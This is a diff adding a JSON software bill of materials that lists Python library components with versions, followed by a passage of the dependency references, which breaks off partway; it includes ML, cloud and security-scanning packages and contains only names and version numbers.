@@ -1,0 +1,1358 @@
+{
+  "components": [
+    {
+      "bom-ref": "BomRef.5560199391031652.690938310045873",
+      "name": "CacheControl",
+      "type": "library",
+      "version": "0.14.4"
+    },
+    {
+      "bom-ref": "BomRef.8995629880660332.13590295512208228",
+      "name": "Flask",
+      "type": "library",
+      "version": "3.1.3"
+    },
+    {
+      "bom-ref": "BomRef.769310632010228.26031762086286125",
+      "name": "GitPython",
+      "type": "library",
+      "version": "3.1.46"
+    },
+    {
+      "bom-ref": "BomRef.49186881030880214.5864943477936386",
+      "name": "Jinja2",
+      "type": "library",
+      "version": "3.1.6"
+    },
+    {
+      "bom-ref": "BomRef.5522601275987341.7660606554463646",
+      "name": "Mako",
+      "type": "library",
+      "version": "1.3.11"
+    },
+    {
+      "bom-ref": "BomRef.6377351443095531.8924534732361207",
+      "name": "MarkupSafe",
+      "type": "library",
+      "version": "3.0.3"
+    },
+    {
+      "bom-ref": "BomRef.24031511365017189.17980528138290197",
+      "name": "PyYAML",
+      "type": "library",
+      "version": "6.0.3"
+    },
+    {
+      "bom-ref": "BomRef.6341681101806554.5394383601886171",
+      "name": "Pygments",
+      "type": "library",
+      "version": "2.20.0"
+    },
+    {
+      "bom-ref": "BomRef.3368610736939872.6746994689748232",
+      "name": "SQLAlchemy",
+      "type": "library",
+      "version": "2.0.49"
+    },
+    {
+      "bom-ref": "BomRef.005285023189862903.5890003696791456",
+      "name": "Werkzeug",
+      "type": "library",
+      "version": "3.1.8"
+    },
+    {
+      "bom-ref": "BomRef.06868343557128964.1437668892631916",
+      "name": "aiobotocore",
+      "type": "library",
+      "version": "3.4.0"
+    },
+    {
+      "bom-ref": "BomRef.46361430097688927.8675424204183954",
+      "name": "aiohappyeyeballs",
+      "type": "library",
+      "version": "2.6.1"
+    },
+    {
+      "bom-ref": "BomRef.5680587905970065.14931642437929904",
+      "name": "aiohttp",
+      "type": "library",
+      "version": "3.13.5"
+    },
+    {
+      "bom-ref": "BomRef.5401322033310336.16340866460025272",
+      "name": "aioitertools",
+      "type": "library",
+      "version": "0.13.0"
+    },
+    {
+      "bom-ref": "BomRef.3482990664577613.3806638066816237",
+      "name": "aiosignal",
+      "type": "library",
+      "version": "1.4.0"
+    },
+    {
+      "bom-ref": "BomRef.49302790892889714.06325449848100961",
+      "name": "alembic",
+      "type": "library",
+      "version": "1.18.4"
+    },
+    {
+      "bom-ref": "BomRef.045402108315715006.4578414240873443",
+      "name": "annotated-doc",
+      "type": "library",
+      "version": "0.0.4"
+    },
+    {
+      "bom-ref": "BomRef.17386024104240705.43791923057086035",
+      "name": "annotated-types",
+      "type": "library",
+      "version": "0.7.0"
+    },
+    {
+      "bom-ref": "BomRef.6524449067599226.2821605584493171",
+      "name": "anyio",
+      "type": "library",
+      "version": "4.13.0"
+    },
+    {
+      "bom-ref": "BomRef.42505345810743533.07763084376913965",
+      "name": "attrs",
+      "type": "library",
+      "version": "26.1.0"
+    },
+    {
+      "bom-ref": "BomRef.24346160108319492.9623473673872113",
+      "name": "backoff",
+      "type": "library",
+      "version": "2.2.1"
+    },
+    {
+      "bom-ref": "BomRef.27103099570523215.811127461042639",
+      "name": "backports.zstd",
+      "type": "library",
+      "version": "1.3.0"
+    },
+    {
+      "bom-ref": "BomRef.9108910417177588.3848555296627503",
+      "name": "bandit",
+      "type": "library",
+      "version": "1.9.4"
+    },
+    {
+      "bom-ref": "BomRef.3850892628286935.5306437378251898",
+      "name": "blinker",
+      "type": "library",
+      "version": "1.9.0"
+    },
+    {
+      "bom-ref": "BomRef.5818243389010039.5845940526961765",
+      "name": "boolean.py",
+      "type": "library",
+      "version": "5.0"
+    },
+    {
+      "bom-ref": "BomRef.1468219299700202.011364207097053547",
+      "name": "botocore",
+      "type": "library",
+      "version": "1.42.84"
+    },
+    {
+      "bom-ref": "BomRef.7557422137261933.2826512351538685",
+      "name": "brotli",
+      "type": "library",
+      "version": "1.2.0"
+    },
+    {
+      "bom-ref": "BomRef.18262133784039014.1855683775452096",
+      "name": "cachetools",
+      "type": "library",
+      "version": "7.0.5"
+    },
+    {
+      "bom-ref": "BomRef.16604888512394522.3587178337588883",
+      "name": "certifi",
+      "type": "library",
+      "version": "2026.2.25"
+    },
+    {
+      "bom-ref": "BomRef.6924230748676002.43481606833950437",
+      "name": "cffi",
+      "type": "library",
+      "version": "2.0.0"
+    },
+    {
+      "bom-ref": "BomRef.4824263924728246.31192077168082155",
+      "name": "charset-normalizer",
+      "type": "library",
+      "version": "3.4.7"
+    },
+    {
+      "bom-ref": "BomRef.13582563166644324.7214241252746653",
+      "name": "click",
+      "type": "library",
+      "version": "8.3.2"
+    },
+    {
+      "bom-ref": "BomRef.44090615388607146.6230419506476795",
+      "name": "cloudpickle",
+      "type": "library",
+      "version": "3.1.2"
+    },
+    {
+      "bom-ref": "BomRef.4025115195247786.39660298909943315",
+      "name": "contourpy",
+      "type": "library",
+      "version": "1.3.3"
+    },
+    {
+      "bom-ref": "BomRef.9161284938584172.33559671905716526",
+      "name": "cryptography",
+      "type": "library",
+      "version": "46.0.7"
+    },
+    {
+      "bom-ref": "BomRef.48740936768738197.9450604092701957",
+      "name": "cycler",
+      "type": "library",
+      "version": "0.12.1"
+    },
+    {
+      "bom-ref": "BomRef.04657202190697718.8092229105532596",
+      "name": "cyclonedx-python-lib",
+      "type": "library",
+      "version": "11.7.0"
+    },
+    {
+      "bom-ref": "BomRef.034494218151510436.4163698013064713",
+      "name": "databricks-sdk",
+      "type": "library",
+      "version": "0.102.0"
+    },
+    {
+      "bom-ref": "BomRef.12355930974421991.4509254841044783",
+      "name": "decorator",
+      "type": "library",
+      "version": "5.2.1"
+    },
+    {
+      "bom-ref": "BomRef.3604194409797439.5135610751352061",
+      "name": "defusedxml",
+      "type": "library",
+      "version": "0.7.1"
+    },
+    {
+      "bom-ref": "BomRef.4305699851978988.747702511413314",
+      "name": "dill",
+      "type": "library",
+      "version": "0.4.1"
+    },
+    {
+      "bom-ref": "BomRef.21909344482899917.9099685469144134",
+      "name": "distro",
+      "type": "library",
+      "version": "1.9.0"
+    },
+    {
+      "bom-ref": "BomRef.3248618945004188.9194077628720031",
+      "name": "docker",
+      "type": "library",
+      "version": "7.1.0"
+    },
+    {
+      "bom-ref": "BomRef.34813844216303236.009368770277514704",
+      "name": "fastapi",
+      "type": "library",
+      "version": "0.136.0"
+    },
+    {
+      "bom-ref": "BomRef.907534746682227.2533510747136416",
+      "name": "fickling",
+      "type": "library",
+      "version": "0.1.10"
+    },
+    {
+      "bom-ref": "BomRef.7750625157489638.491926198450087",
+      "name": "filelock",
+      "type": "library",
+      "version": "3.28.0"
+    },
+    {
+      "bom-ref": "BomRef.1726643200250012.670902319725467",
+      "name": "flask-cors",
+      "type": "library",
+      "version": "6.0.2"
+    },
+    {
+      "bom-ref": "BomRef.637720586293097.6043888031575683",
+      "name": "flatbuffers",
+      "type": "library",
+      "version": "25.12.19"
+    },
+    {
+      "bom-ref": "BomRef.9840122809097388.17312555110048822",
+      "name": "fonttools",
+      "type": "library",
+      "version": "4.62.1"
+    },
+    {
+      "bom-ref": "BomRef.936612854212004.6400808723754539",
+      "name": "frozenlist",
+      "type": "library",
+      "version": "1.8.0"
+    },
+    {
+      "bom-ref": "BomRef.2820257503469723.2683475884656128",
+      "name": "fsspec",
+      "type": "library",
+      "version": "2026.3.0"
+    },
+    {
+      "bom-ref": "BomRef.2319916121087663.1751521153289568",
+      "name": "gcsfs",
+      "type": "library",
+      "version": "2026.3.0"
+    },
+    {
+      "bom-ref": "BomRef.0011770997980818931.318210011098351",
+      "name": "gitdb",
+      "type": "library",
+      "version": "4.0.12"
+    },
+    {
+      "bom-ref": "BomRef.10315509353229524.3543523673041432",
+      "name": "google-api-core",
+      "type": "library",
+      "version": "2.30.3"
+    },
+    {
+      "bom-ref": "BomRef.9423990836384387.3284388580436176",
+      "name": "google-auth",
+      "type": "library",
+      "version": "2.49.2"
+    },
+    {
+      "bom-ref": "BomRef.6759153719988243.43878742121082415",
+      "name": "google-auth-oauthlib",
+      "type": "library",
+      "version": "1.3.1"
+    },
+    {
+      "bom-ref": "BomRef.9070253676635566.8134539522814354",
+      "name": "google-cloud-core",
+      "type": "library",
+      "version": "2.5.1"
+    },
+    {
+      "bom-ref": "BomRef.7930436764561862.06023976813244003",
+      "name": "google-cloud-storage",
+      "type": "library",
+      "version": "3.10.1"
+    },
+    {
+      "bom-ref": "BomRef.1432802986413425.5341217105028597",
+      "name": "google-cloud-storage-control",
+      "type": "library",
+      "version": "1.11.0"
+    },
+    {
+      "bom-ref": "BomRef.5714527063993494.6380847413948165",
+      "name": "google-crc32c",
+      "type": "library",
+      "version": "1.8.0"
+    },
+    {
+      "bom-ref": "BomRef.25054315507718716.5137134834219429",
+      "name": "google-resumable-media",
+      "type": "library",
+      "version": "2.8.2"
+    },
+    {
+      "bom-ref": "BomRef.017316173622831443.16033886044889123",
+      "name": "googleapis-common-protos",
+      "type": "library",
+      "version": "1.74.0"
+    },
+    {
+      "bom-ref": "BomRef.7581519040449005.5336058745078798",
+      "name": "graphene",
+      "type": "library",
+      "version": "3.4.3"
+    },
+    {
+      "bom-ref": "BomRef.3109348235258431.39127112895769256",
+      "name": "graphql-core",
+      "type": "library",
+      "version": "3.2.8"
+    },
+    {
+      "bom-ref": "BomRef.32799020989533234.6968726715939012",
+      "name": "graphql-relay",
+      "type": "library",
+      "version": "3.2.0"
+    },
+    {
+      "bom-ref": "BomRef.18824706125311597.9847401169876022",
+      "name": "grpc-google-iam-v1",
+      "type": "library",
+      "version": "0.14.4"
+    },
+    {
+      "bom-ref": "BomRef.5894952353895195.5335568084713901",
+      "name": "grpcio",
+      "type": "library",
+      "version": "1.80.0"
+    },
+    {
+      "bom-ref": "BomRef.07216279964786865.7230022667429047",
+      "name": "grpcio-status",
+      "type": "library",
+      "version": "1.80.0"
+    },
+    {
+      "bom-ref": "BomRef.19821389629784503.8266397853515",
+      "name": "gunicorn",
+      "type": "library",
+      "version": "25.3.0"
+    },
+    {
+      "bom-ref": "BomRef.07800345734804703.49762339431349334",
+      "name": "h11",
+      "type": "library",
+      "version": "0.16.0"
+    },
+    {
+      "bom-ref": "BomRef.02103514324009126.6094044255493148",
+      "name": "h5py",
+      "type": "library",
+      "version": "3.16.0"
+    },
+    {
+      "bom-ref": "BomRef.6861823075314727.505835958513778",
+      "name": "hf-xet",
+      "type": "library",
+      "version": "1.4.3"
+    },
+    {
+      "bom-ref": "BomRef.3325117711125405.16405466130640312",
+      "name": "httpcore",
+      "type": "library",
+      "version": "1.0.9"
+    },
+    {
+      "bom-ref": "BomRef.8121408321985905.04631676417456165",
+      "name": "httpx",
+      "type": "library",
+      "version": "0.28.1"
+    },
+    {
+      "bom-ref": "BomRef.14922306360036597.44073022430429487",
+      "name": "huey",
+      "type": "library",
+      "version": "2.6.0"
+    },
+    {
+      "bom-ref": "BomRef.3485920486399815.9477336133464814",
+      "name": "huggingface_hub",
+      "type": "library",
+      "version": "1.11.0"
+    },
+    {
+      "bom-ref": "BomRef.09878564756775976.7878865504814573",
+      "name": "idna",
+      "type": "library",
+      "version": "3.11"
+    },
+    {
+      "bom-ref": "BomRef.08942565235367073.4085943056375487",
+      "name": "importlib_metadata",
+      "type": "library",
+      "version": "8.7.1"
+    },
+    {
+      "bom-ref": "BomRef.4404941464232206.4853497415248088",
+      "name": "inflate64",
+      "type": "library",
+      "version": "1.0.4"
+    },
+    {
+      "bom-ref": "BomRef.33555171198654465.19173656237491488",
+      "name": "itsdangerous",
+      "type": "library",
+      "version": "2.2.0"
+    },
+    {
+      "bom-ref": "BomRef.7848788685853527.28594310403410883",
+      "name": "jmespath",
+      "type": "library",
+      "version": "1.1.0"
+    },
+    {
+      "bom-ref": "BomRef.7412717739126425.9999444167903435",
+      "name": "joblib",
+      "type": "library",
+      "version": "1.5.3"
+    },
+    {
+      "bom-ref": "BomRef.28221433628256.1523608735720694",
+      "name": "kiwisolver",
+      "type": "library",
+      "version": "1.5.0"
+    },
+    {
+      "bom-ref": "BomRef.895929647650957.6955412166869052",
+      "name": "license-expression",
+      "type": "library",
+      "version": "30.4.4"
+    },
+    {
+      "bom-ref": "BomRef.6199077332529253.9128944399037019",
+      "name": "markdown-it-py",
+      "type": "library",
+      "version": "4.0.0"
+    },
+    {
+      "bom-ref": "BomRef.6304305676653037.16139517029674777",
+      "name": "matplotlib",
+      "type": "library",
+      "version": "3.10.8"
+    },
+    {
+      "bom-ref": "BomRef.7173253369280046.47368730011329807",
+      "name": "mdurl",
+      "type": "library",
+      "version": "0.1.2"
+    },
+    {
+      "bom-ref": "BomRef.1050553362607839.5282893334718983",
+      "name": "ml_dtypes",
+      "type": "library",
+      "version": "0.5.4"
+    },
+    {
+      "bom-ref": "BomRef.1058186182746077.9440862191382844",
+      "name": "mlflow",
+      "type": "library",
+      "version": "3.10.0"
+    },
+    {
+      "bom-ref": "BomRef.8176470624691831.7013981171630885",
+      "name": "mlflow-skinny",
+      "type": "library",
+      "version": "3.10.0"
+    },
+    {
+      "bom-ref": "BomRef.48260033137830427.7326711294155831",
+      "name": "mlflow-tracing",
+      "type": "library",
+      "version": "3.10.0"
+    },
+    {
+      "bom-ref": "BomRef.8255206862766266.40314735644344646",
+      "name": "modelaudit",
+      "type": "library",
+      "version": "0.2.40"
+    },
+    {
+      "bom-ref": "BomRef.8327734309233487.27596468362571247",
+      "name": "modelaudit-picklescan",
+      "type": "library",
+      "version": "0.1.2"
+    },
+    {
+      "bom-ref": "BomRef.5878541841475388.30310728247363905",
+      "name": "mpmath",
+      "type": "library",
+      "version": "1.3.0"
+    },
+    {
+      "bom-ref": "BomRef.05268548449414767.4195540537089245",
+      "name": "msgpack",
+      "type": "library",
+      "version": "1.1.2"
+    },
+    {
+      "bom-ref": "BomRef.07065059293682419.9548507268478947",
+      "name": "multidict",
+      "type": "library",
+      "version": "6.7.1"
+    },
+    {
+      "bom-ref": "BomRef.4263762677099783.5344334331365403",
+      "name": "multivolumefile",
+      "type": "library",
+      "version": "0.2.3"
+    },
+    {
+      "bom-ref": "BomRef.4917273060227638.8504852455897299",
+      "name": "networkx",
+      "type": "library",
+      "version": "3.6.1"
+    },
+    {
+      "bom-ref": "BomRef.6877575388201984.44293311648420974",
+      "name": "numpy",
+      "type": "library",
+      "version": "2.4.4"
+    },
+    {
+      "bom-ref": "BomRef.7322011135982046.012069101568065288",
+      "name": "oauthlib",
+      "type": "library",
+      "version": "3.3.1"
+    },
+    {
+      "bom-ref": "BomRef.29154944133480487.592995442036442",
+      "name": "onnx",
+      "type": "library",
+      "version": "1.21.0"
+    },
+    {
+      "bom-ref": "BomRef.21162741807756102.5571521283235905",
+      "name": "opentelemetry-api",
+      "type": "library",
+      "version": "1.41.0"
+    },
+    {
+      "bom-ref": "BomRef.9757768562585178.199029717850702",
+      "name": "opentelemetry-proto",
+      "type": "library",
+      "version": "1.41.0"
+    },
+    {
+      "bom-ref": "BomRef.5143149595787105.6591790318279649",
+      "name": "opentelemetry-sdk",
+      "type": "library",
+      "version": "1.41.0"
+    },
+    {
+      "bom-ref": "BomRef.720710808146673.05414964903196484",
+      "name": "opentelemetry-semantic-conventions",
+      "type": "library",
+      "version": "0.62b0"
+    },
+    {
+      "bom-ref": "BomRef.20773621563999456.5858028328418696",
+      "name": "packageurl-python",
+      "type": "library",
+      "version": "0.17.6"
+    },
+    {
+      "bom-ref": "BomRef.3537750082426476.9140221703044139",
+      "name": "packaging",
+      "type": "library",
+      "version": "26.1"
+    },
+    {
+      "bom-ref": "BomRef.9554299319784753.9947863464302448",
+      "name": "pandas",
+      "type": "library",
+      "version": "2.3.3"
+    },
+    {
+      "bom-ref": "BomRef.022005416253850774.3193651287275534",
+      "name": "picklescan",
+      "type": "library",
+      "version": "1.0.4"
+    },
+    {
+      "bom-ref": "BomRef.598597294006615.8721210737192887",
+      "name": "pillow",
+      "type": "library",
+      "version": "12.2.0"
+    },
+    {
+      "bom-ref": "BomRef.31491594671195344.9754476579684653",
+      "name": "pip",
+      "type": "library",
+      "version": "26.0.1"
+    },
+    {
+      "bom-ref": "BomRef.5869724963051772.4483174458289165",
+      "name": "pip-api",
+      "type": "library",
+      "version": "0.0.34"
+    },
+    {
+      "bom-ref": "BomRef.2869591433719193.8180088370787095",
+      "name": "pip-requirements-parser",
+      "type": "library",
+      "version": "32.0.1"
+    },
+    {
+      "bom-ref": "BomRef.07001413142932933.5745223568187394",
+      "name": "pip_audit",
+      "type": "library",
+      "version": "2.10.0"
+    },
+    {
+      "bom-ref": "BomRef.2527870112661118.7756036202360749",
+      "name": "platformdirs",
+      "type": "library",
+      "version": "4.9.6"
+    },
+    {
+      "bom-ref": "BomRef.8581529242039442.27530834601816734",
+      "name": "posthog",
+      "type": "library",
+      "version": "7.12.0"
+    },
+    {
+      "bom-ref": "BomRef.058086352572724986.6787706366080802",
+      "name": "prettytable",
+      "type": "library",
+      "version": "3.17.0"
+    },
+    {
+      "bom-ref": "BomRef.01761931343185441.14098884512472876",
+      "name": "propcache",
+      "type": "library",
+      "version": "0.4.1"
+    },
+    {
+      "bom-ref": "BomRef.2153407053683366.21216666423982355",
+      "name": "proto-plus",
+      "type": "library",
+      "version": "1.27.2"
+    },
+    {
+      "bom-ref": "BomRef.2606858409143358.903307879152864",
+      "name": "protobuf",
+      "type": "library",
+      "version": "6.33.6"
+    },
+    {
+      "bom-ref": "BomRef.1909070609230531.675185424529619",
+      "name": "psutil",
+      "type": "library",
+      "version": "7.2.2"
+    },
+    {
+      "bom-ref": "BomRef.5132398897461105.46696528528935977",
+      "name": "py-serializable",
+      "type": "library",
+      "version": "2.1.0"
+    },
+    {
+      "bom-ref": "BomRef.4712135076534738.04900736998217081",
+      "name": "py-ubjson",
+      "type": "library",
+      "version": "0.16.1"
+    },
+    {
+      "bom-ref": "BomRef.7799985975611619.4689608204723438",
+      "name": "py7zr",
+      "type": "library",
+      "version": "1.1.0"
+    },
+    {
+      "bom-ref": "BomRef.4296858536135366.2842951147620073",
+      "name": "pyarrow",
+      "type": "library",
+      "version": "23.0.1"
+    },
+    {
+      "bom-ref": "BomRef.859767764913831.07194610149769254",
+      "name": "pyasn1",
+      "type": "library",
+      "version": "0.6.3"
+    },
+    {
+      "bom-ref": "BomRef.3780110317337849.1837464678957208",
+      "name": "pyasn1_modules",
+      "type": "library",
+      "version": "0.4.2"
+    },
+    {
+      "bom-ref": "BomRef.706327878710936.18509679981734495",
+      "name": "pybcj",
+      "type": "library",
+      "version": "1.0.7"
+    },
+    {
+      "bom-ref": "BomRef.1834605376973163.07048792176677388",
+      "name": "pycparser",
+      "type": "library",
+      "version": "3.0"
+    },
+    {
+      "bom-ref": "BomRef.8142520883095784.5503242597710283",
+      "name": "pycryptodomex",
+      "type": "library",
+      "version": "3.23.0"
+    },
+    {
+      "bom-ref": "BomRef.9617674445949904.3202696341867043",
+      "name": "pydantic",
+      "type": "library",
+      "version": "2.13.2"
+    },
+    {
+      "bom-ref": "BomRef.6072045905978448.9210639570158323",
+      "name": "pydantic_core",
+      "type": "library",
+      "version": "2.46.2"
+    },
+    {
+      "bom-ref": "BomRef.6155020049857483.748125617233508",
+      "name": "pyparsing",
+      "type": "library",
+      "version": "3.3.2"
+    },
+    {
+      "bom-ref": "BomRef.30946563573541674.48477655898214367",
+      "name": "pyppmd",
+      "type": "library",
+      "version": "1.3.1"
+    },
+    {
+      "bom-ref": "BomRef.6306513410838671.4901026295276152",
+      "name": "python-dateutil",
+      "type": "library",
+      "version": "2.9.0.post0"
+    },
+    {
+      "bom-ref": "BomRef.8405864503674071.07513995322861555",
+      "name": "python-dotenv",
+      "type": "library",
+      "version": "1.2.2"
+    },
+    {
+      "bom-ref": "BomRef.03158773642084711.1576905302374213",
+      "name": "pytz",
+      "type": "library",
+      "version": "2026.1.post1"
+    },
+    {
+      "bom-ref": "BomRef.33201143777741493.4606222934245785",
+      "name": "regex",
+      "type": "library",
+      "version": "2026.4.4"
+    },
+    {
+      "bom-ref": "BomRef.3358681175431537.2502777237180729",
+      "name": "requests",
+      "type": "library",
+      "version": "2.33.1"
+    },
+    {
+      "bom-ref": "BomRef.1065417163062975.6642170305281083",
+      "name": "requests-oauthlib",
+      "type": "library",
+      "version": "2.0.0"
+    },
+    {
+      "bom-ref": "BomRef.9650612914106284.9225736622750518",
+      "name": "rich",
+      "type": "library",
+      "version": "15.0.0"
+    },
+    {
+      "bom-ref": "BomRef.6569761486629394.25834061496646343",
+      "name": "s3fs",
+      "type": "library",
+      "version": "2026.3.0"
+    },
+    {
+      "bom-ref": "BomRef.787800053406513.044713021296067246",
+      "name": "safetensors",
+      "type": "library",
+      "version": "0.7.0"
+    },
+    {
+      "bom-ref": "BomRef.28014190257657523.638344086123739",
+      "name": "scikit-learn",
+      "type": "library",
+      "version": "1.8.0"
+    },
+    {
+      "bom-ref": "BomRef.9326058442191911.12709178154758227",
+      "name": "scipy",
+      "type": "library",
+      "version": "1.17.1"
+    },
+    {
+      "bom-ref": "BomRef.3929373357399798.7461550618477735",
+      "name": "setuptools",
+      "type": "library",
+      "version": "81.0.0"
+    },
+    {
+      "bom-ref": "BomRef.18396798590368346.5758031399149558",
+      "name": "shellingham",
+      "type": "library",
+      "version": "1.5.4"
+    },
+    {
+      "bom-ref": "BomRef.2959990282899746.3231249251462036",
+      "name": "six",
+      "type": "library",
+      "version": "1.17.0"
+    },
+    {
+      "bom-ref": "BomRef.6329562151593575.7752433965008351",
+      "name": "skops",
+      "type": "library",
+      "version": "0.13.0"
+    },
+    {
+      "bom-ref": "BomRef.5820232129595122.9617427789299248",
+      "name": "smmap",
+      "type": "library",
+      "version": "5.0.3"
+    },
+    {
+      "bom-ref": "BomRef.12313754762195073.05436435118251204",
+      "name": "sortedcontainers",
+      "type": "library",
+      "version": "2.4.0"
+    },
+    {
+      "bom-ref": "BomRef.23022813893137806.9472655893741919",
+      "name": "sqlparse",
+      "type": "library",
+      "version": "0.5.5"
+    },
+    {
+      "bom-ref": "BomRef.27220290062444086.9599265206298201",
+      "name": "starlette",
+      "type": "library",
+      "version": "1.0.0"
+    },
+    {
+      "bom-ref": "BomRef.6595201221162285.28986900803813",
+      "name": "stevedore",
+      "type": "library",
+      "version": "5.7.0"
+    },
+    {
+      "bom-ref": "BomRef.14856856298349252.7952910318527492",
+      "name": "sympy",
+      "type": "library",
+      "version": "1.14.0"
+    },
+    {
+      "bom-ref": "BomRef.1555117480187337.31124857503418457",
+      "name": "termcolor",
+      "type": "library",
+      "version": "3.3.0"
+    },
+    {
+      "bom-ref": "BomRef.19244480891789983.43176216494570985",
+      "name": "texttable",
+      "type": "library",
+      "version": "1.7.0"
+    },
+    {
+      "bom-ref": "BomRef.9508154906361261.049526054640007366",
+      "name": "tflite",
+      "type": "library",
+      "version": "2.18.0"
+    },
+    {
+      "bom-ref": "BomRef.8285641553425861.8314447929711924",
+      "name": "threadpoolctl",
+      "type": "library",
+      "version": "3.6.0"
+    },
+    {
+      "bom-ref": "BomRef.17287688461568362.47945544135716645",
+      "name": "tokenizers",
+      "type": "library",
+      "version": "0.22.2"
+    },
+    {
+      "bom-ref": "BomRef.7978752087593074.32979314487579636",
+      "name": "tomli",
+      "type": "library",
+      "version": "2.4.1"
+    },
+    {
+      "bom-ref": "BomRef.9032716119600479.976197974867525",
+      "name": "tomli_w",
+      "type": "library",
+      "version": "1.2.0"
+    },
+    {
+      "bom-ref": "BomRef.859069969737251.5026063694945134",
+      "name": "torch",
+      "type": "library",
+      "version": "2.11.0"
+    },
+    {
+      "bom-ref": "BomRef.9322247450424382.34200503527004866",
+      "name": "tqdm",
+      "type": "library",
+      "version": "4.67.3"
+    },
+    {
+      "bom-ref": "BomRef.5145132851995741.1613938197619431",
+      "name": "transformers",
+      "type": "library",
+      "version": "5.5.4"
+    },
+    {
+      "bom-ref": "BomRef.3432325718366507.6159441187640797",
+      "name": "typer",
+      "type": "library",
+      "version": "0.24.1"
+    },
+    {
+      "bom-ref": "BomRef.6551437888350861.17056193065060887",
+      "name": "typing-inspection",
+      "type": "library",
+      "version": "0.4.2"
+    },
+    {
+      "bom-ref": "BomRef.07091832226930939.7673742754670132",
+      "name": "typing_extensions",
+      "type": "library",
+      "version": "4.15.0"
+    },
+    {
+      "bom-ref": "BomRef.6672167261494709.6921887589808193",
+      "name": "tzdata",
+      "type": "library",
+      "version": "2026.1"
+    },
+    {
+      "bom-ref": "BomRef.004271940395409013.34144534862892817",
+      "name": "urllib3",
+      "type": "library",
+      "version": "2.6.3"
+    },
+    {
+      "bom-ref": "BomRef.3596599767068144.28536797310370465",
+      "name": "uvicorn",
+      "type": "library",
+      "version": "0.44.0"
+    },
+    {
+      "bom-ref": "BomRef.559437335258894.3959113005077758",
+      "name": "wcwidth",
+      "type": "library",
+      "version": "0.6.0"
+    },
+    {
+      "bom-ref": "BomRef.19420220600073312.8537138484530382",
+      "name": "wrapt",
+      "type": "library",
+      "version": "2.1.2"
+    },
+    {
+      "bom-ref": "BomRef.38557386196022436.3096001331965854",
+      "name": "xgboost",
+      "type": "library",
+      "version": "3.2.0"
+    },
+    {
+      "bom-ref": "BomRef.02568522389979011.11444445563900596",
+      "name": "yarl",
+      "type": "library",
+      "version": "1.23.0"
+    },
+    {
+      "bom-ref": "BomRef.35980000258800326.18404456328780527",
+      "name": "yaspin",
+      "type": "library",
+      "version": "3.4.0"
+    },
+    {
+      "bom-ref": "BomRef.4781735997464477.9812891795904201",
+      "name": "zipp",
+      "type": "library",
+      "version": "3.23.1"
+    }
+  ],
+  "dependencies": [
+    { "ref": "BomRef.5560199391031652.690938310045873" },
+    { "ref": "BomRef.8995629880660332.13590295512208228" },
+    { "ref": "BomRef.769310632010228.26031762086286125" },
+    { "ref": "BomRef.49186881030880214.5864943477936386" },
+    { "ref": "BomRef.5522601275987341.7660606554463646" },
+    { "ref": "BomRef.6377351443095531.8924534732361207" },
+    { "ref": "BomRef.24031511365017189.17980528138290197" },
+    { "ref": "BomRef.6341681101806554.5394383601886171" },
+    { "ref": "BomRef.3368610736939872.6746994689748232" },
+    { "ref": "BomRef.005285023189862903.5890003696791456" },
+    { "ref": "BomRef.06868343557128964.1437668892631916" },
+    { "ref": "BomRef.46361430097688927.8675424204183954" },
+    { "ref": "BomRef.5680587905970065.14931642437929904" },
+    { "ref": "BomRef.5401322033310336.16340866460025272" },
+    { "ref": "BomRef.3482990664577613.3806638066816237" },
+    { "ref": "BomRef.49302790892889714.06325449848100961" },
+    { "ref": "BomRef.045402108315715006.4578414240873443" },
+    { "ref": "BomRef.17386024104240705.43791923057086035" },
+    { "ref": "BomRef.6524449067599226.2821605584493171" },
+    { "ref": "BomRef.42505345810743533.07763084376913965" },
+    { "ref": "BomRef.24346160108319492.9623473673872113" },
+    { "ref": "BomRef.27103099570523215.811127461042639" },
+    { "ref": "BomRef.9108910417177588.3848555296627503" },
+    { "ref": "BomRef.3850892628286935.5306437378251898" },
+    { "ref": "BomRef.5818243389010039.5845940526961765" },
+    { "ref": "BomRef.1468219299700202.011364207097053547" },
+    { "ref": "BomRef.7557422137261933.2826512351538685" },
+    { "ref": "BomRef.18262133784039014.1855683775452096" },
+    { "ref": "BomRef.16604888512394522.3587178337588883" },
+    { "ref": "BomRef.6924230748676002.43481606833950437" },
+    { "ref": "BomRef.4824263924728246.31192077168082155" },
+    { "ref": "BomRef.13582563166644324.7214241252746653" },
+    { "ref": "BomRef.44090615388607146.6230419506476795" },
+    { "ref": "BomRef.4025115195247786.39660298909943315" },
+    { "ref": "BomRef.9161284938584172.33559671905716526" },
+    { "ref": "BomRef.48740936768738197.9450604092701957" },
+    { "ref": "BomRef.04657202190697718.8092229105532596" },
+    { "ref": "BomRef.034494218151510436.4163698013064713" },
+    { "ref": "BomRef.12355930974421991.4509254841044783" },
+    { "ref": "BomRef.3604194409797439.5135610751352061" },
+    { "ref": "BomRef.4305699851978988.747702511413314" },
+    { "ref": "BomRef.21909344482899917.9099685469144134" },
+    { "ref": "BomRef.3248618945004188.9194077628720031" },
+    { "ref": "BomRef.34813844216303236.009368770277514704" },
+    { "ref": "BomRef.907534746682227.2533510747136416" },
+    { "ref": "BomRef.7750625157489638.491926198450087" },
+    { "ref": "BomRef.1726643200250012.670902319725467" },
+    { "ref": "BomRef.637720586293097.6043888031575683" },
+    { "ref": "BomRef.9840122809097388.17312555110048822" },
+    { "ref": "BomRef.936612854212004.6400808723754539" },
+    { "ref": "BomRef.2820257503469723.2683475884656128" },
+    { "ref": "BomRef.2319916121087663.1751521153289568" },
+    { "ref": "BomRef.0011770997980818931.318210011098351" },
+    { "ref": "BomRef.10315509353229524.3543523673041432" },
+    { "ref": "BomRef.9423990836384387.3284388580436176" },
+    { "ref": "BomRef.6759153719988243.43878742121082415" },
+    { "ref": "BomRef.9070253676635566.8134539522814354" },
+    { "ref": "BomRef.7930436764561862.06023976813244003" },
+    { "ref": "BomRef.1432802986413425.5341217105028597" },
+    { "ref": "BomRef.5714527063993494.6380847413948165" },
+    { "ref": "BomRef.25054315507718716.5137134834219429" },
+    { "ref": "BomRef.017316173622831443.16033886044889123" },
+    { "ref": "BomRef.7581519040449005.5336058745078798" },
+    { "ref": "BomRef.3109348235258431.39127112895769256" },
+    { "ref": "BomRef.32799020989533234.6968726715939012" },
+    { "ref": "BomRef.18824706125311597.9847401169876022" },
+    { "ref": "BomRef.5894952353895195.5335568084713901" },
+    { "ref": "BomRef.07216279964786865.7230022667429047" },
+    { "ref": "BomRef.19821389629784503.8266397853515" },
+    { "ref": "BomRef.07800345734804703.49762339431349334" },
+    { "ref": "BomRef.02103514324009126.6094044255493148" },
+    { "ref": "BomRef.6861823075314727.505835958513778" },
+    { "ref": "BomRef.3325117711125405.16405466130640312" },
